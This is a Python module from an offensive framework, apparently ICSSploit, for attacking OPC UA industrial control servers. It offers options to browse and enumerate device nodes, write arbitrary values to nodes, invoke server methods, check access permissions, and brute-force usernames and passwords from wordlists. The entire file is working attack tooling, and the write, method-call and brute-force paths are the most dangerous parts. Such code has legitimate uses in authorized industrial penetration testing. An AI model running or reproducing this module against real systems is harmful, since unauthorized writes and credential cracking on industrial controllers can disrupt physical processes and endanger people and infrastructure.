from src import (
    exploits,
    print_success,
    print_status,
    print_error,
    validators,
)
from src.clients.opcua_client import OPCUAClient


class Exploit(exploits.Exploit):
    __info__ = {
        'name': 'OPC UA Device Control',
        'authors': [
            'ICSSploit Team'  # icssploit module
        ],
        'description': 'Control OPC UA servers by reading/writing nodes and calling methods.',
        'references': [
            'https://opcfoundation.org/',
        ],
        'devices': [
            'OPC UA compliant servers',
        ],
    }

    target = exploits.Option('', 'Target OPC UA server IP address')
    port = exploits.Option(4840, 'OPC UA port, default is 4840/TCP', validators=validators.integer)
    security_policy = exploits.Option('None', 'Security policy', validators=validators.choice(['None', 'Basic128Rsa15', 'Basic256', 'Basic256Sha256']))
    security_mode = exploits.Option('None', 'Security mode', validators=validators.choice(['None', 'Sign', 'SignAndEncrypt']))
    username = exploits.Option('', 'Username for authentication')
    password = exploits.Option('', 'Password for authentication')
    operation = exploits.Option('read', 'Operation to perform: read, write, browse, call_method, enumerate, permissions, brute_force', 
                               validators=validators.choice(['read', 'write', 'browse', 'call_method', 'enumerate', 'permissions', 'brute_force']))
    node_id = exploits.Option('i=84', 'Node ID to operate on')
    value = exploits.Option('', 'Value to write (for write operations)')
    browse_path = exploits.Option('i=84', 'Starting node ID for browse operations')
    max_results = exploits.Option(50, 'Maximum number of results for browse operations', validators=validators.integer)
    object_node_id = exploits.Option('', 'Object node ID for method calls')
    method_node_id = exploits.Option('', 'Method node ID for method calls')
    arguments = exploits.Option('', 'Comma-separated arguments for method calls')
    password_wordlist = exploits.Option('', 'Path to password wordlist for brute force')
    username_wordlist = exploits.Option('', 'Path to username wordlist for brute force')
    brute_force_delay = exploits.Option(1.0, 'Delay between brute force attempts in seconds', validators=validators.float)

    def run(self):
        if not self.target:
            print_error("Target IP address is required")
            return
        
        # Construct OPC UA URL
        url = f"opc.tcp://{self.target}:{self.port}"
        
        print_status(f"Connecting to OPC UA server at {url}")
        
        try:
            target = OPCUAClient(name='OPCUAController', url=url, 
                                security_policy=self.security_policy, 
                                security_mode=self.security_mode,
                                username=self.username if self.username else None,
                                password=self.password if self.password else None,
                                timeout=5)
            
            if not target.test_connection():
                print_error(f"Failed to connect to OPC UA server at {url}")
                return
            
            print_success(f"Connected to OPC UA server at {url}")
            
            if self.operation == 'read':
                self._read_operation(target)
            elif self.operation == 'write':
                self._write_operation(target)
            elif self.operation == 'browse':
                self._browse_operation(target)
            elif self.operation == 'call_method':
                self._call_method_operation(target)
            elif self.operation == 'enumerate':
                self._enumerate_operation(target)
            elif self.operation == 'permissions':
                self._permissions_operation(target)
            elif self.operation == 'brute_force':
                self._brute_force_operation(target)
            else:
                print_error(f"Unknown operation: {self.operation}")
            
        except Exception as e:
            print_error(f"Error during OPC UA operation: {e}")
    
    def _read_operation(self, target):
        """Read operation"""
        print_status(f"Reading node {self.node_id}")
        
        try:
            node = target.read_node(self.node_id)
            if node:
                print_success("Node Information:")
                print_status(f"  Node ID: {node.node_id}")
                print_status(f"  Browse Name: {node.browse_name}")
                print_status(f"  Display Name: {node.display_name}")
                print_status(f"  Node Class: {node.node_class}")
                if node.data_type:
                    print_status(f"  Data Type: {node.data_type}")
                if node.value is not None:
                    print_status(f"  Value: {node.value}")
                if node.access_level is not None:
                    print_status(f"  Access Level: {node.access_level}")
                if node.user_access_level is not None:
                    print_status(f"  User Access Level: {node.user_access_level}")
            else:
                print_error("Failed to read node")
        except Exception as e:
            print_error(f"Error reading node: {e}")
    
    def _write_operation(self, target):
        """Write operation"""
        if not self.value:
            print_error("Value is required for write operations")
            return
        
        print_status(f"Writing value {self.value} to node {self.node_id}")
        
        try:
            success = target.write_node(self.node_id, self.value)
            if success:
                print_success("Write operation completed")
            else:
                print_error("Write operation failed")
        except Exception as e:
            print_error(f"Error writing to node: {e}")
    
    def _browse_operation(self, target):
        """Browse operation"""
        print_status(f"Browsing nodes starting from {self.browse_path}")
        
        try:
            nodes = target.browse_nodes(self.browse_path, self.max_results)
            if nodes:
                print_success(f"Found {len(nodes)} nodes:")
                for i, node in enumerate(nodes):
                    print_status(f"  {i+1}. {node.browse_name} ({node.node_class})")
                    print_status(f"      Node ID: {node.node_id}")
                    print_status(f"      Display Name: {node.display_name}")
                    if node.data_type:
                        print_status(f"      Data Type: {node.data_type}")
                    if node.value is not None:
                        print_status(f"      Value: {node.value}")
                    print_status("")
            else:
                print_error("No nodes found")
        except Exception as e:
            print_error(f"Error browsing nodes: {e}")
    
    def _call_method_operation(self, target):
        """Call method operation"""
        if not self.object_node_id or not self.method_node_id:
            print_error("Object node ID and method node ID are required for method calls")
            return
        
        print_status(f"Calling method {self.method_node_id} on object {self.object_node_id}")
        
        try:
            # Parse arguments if provided
            arguments = []
            if self.arguments:
                arguments = [arg.strip() for arg in self.arguments.split(',')]
            
            result = target.call_method(self.object_node_id, self.method_node_id, arguments)
            if result is not None:
                print_success(f"Method call successful, result: {result}")
            else:
                print_error("Method call failed")
        except Exception as e:
            print_error(f"Error calling method: {e}")
    
    def _enumerate_operation(self, target):
        """Enumerate device operation"""
        print_status("Enumerating device nodes")
        
        try:
            # Get server information
            server_name, server_uri, application_uri, product_uri, software_version, build_number = target.get_target_info()
            
            print_success("Server Information:")
            print_status(f"  Server Name: {server_name}")
            print_status(f"  Server URI: {server_uri}")
            print_status(f"  Application URI: {application_uri}")
            print_status(f"  Product URI: {product_uri}")
            print_status(f"  Software Version: {software_version}")
            print_status(f"  Build Number: {build_number}")
            
            # Enumerate nodes by path
            nodes_by_path = target.enumerate_device()
            
            if nodes_by_path:
                print_success("Device Nodes:")
                for path_name, nodes in nodes_by_path.items():
                    print_status(f"  {path_name}: {len(nodes)} nodes")
                    for node in nodes[:10]:  # Show first 10
                        print_status(f"    {path_name}/{node.browse_name}: {node.node_class}")
            else:
                print_status("No nodes found or enumeration failed")
                
        except Exception as e:
            print_error(f"Error enumerating device: {e}")
    
    def _permissions_operation(self, target):
        """Check permissions operation"""
        print_status("Checking permissions for different node types")
        
        try:
            permissions = target.check_permissions()
            
            print_success("Permission Check Results:")
            for perm_name, has_perm in permissions.items():
                status = "✓" if has_perm else "✗"
                print_status(f"  {status} {perm_name}")
                
        except Exception as e:
            print_error(f"Error checking permissions: {e}")
    
    def _brute_force_operation(self, target):
        """Brute force credentials operation"""
        if not self.password_wordlist:
            print_error("Password wordlist is required for brute force operations")
            return
        
        print_status(f"Starting brute force attack with password wordlist: {self.password_wordlist}")
        if self.username_wordlist:
            print_status(f"Using username wordlist: {self.username_wordlist}")
        print_status(f"Delay between attempts: {self.brute_force_delay}s")
        
        try:
            valid_credentials = target.brute_force_credentials(
                password_wordlist_path=self.password_wordlist,
                username_wordlist_path=self.username_wordlist if self.username_wordlist else None,
                delay=self.brute_force_delay
            )
            
            if valid_credentials:
                print_success(f"Brute force completed! Found {len(valid_credentials)} valid credential(s):")
                for cred in valid_credentials:
                    print_status(f"  Username: {cred['username']}")
                    print_status(f"  Password: {cred['password']}")
                    print_status(f"  Found on attempt: {cred['attempt']}")
                    print_status("")
            else:
                print_error("No valid credentials found")
                
        except Exception as e:
            print_error(f"Error during brute force attack: {e}") 